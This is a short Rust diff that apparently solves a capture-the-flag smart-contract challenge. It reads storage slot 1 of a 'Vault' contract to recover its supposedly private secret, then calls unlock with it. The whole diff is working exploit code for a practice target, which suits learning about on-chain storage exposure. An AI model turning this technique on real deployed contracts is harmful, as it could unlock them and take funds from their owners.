@@ -18,6 +18,11 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let contract = Vault::new(target.address, offender.to_owned());
+        let slot = offender
+            .get_storage_at(contract.address(), H256::from_low_u64_be(1), None)
+            .await?;
+        contract.unlock(slot.0).send().await?.await?;
         Ok(())
     }
 }
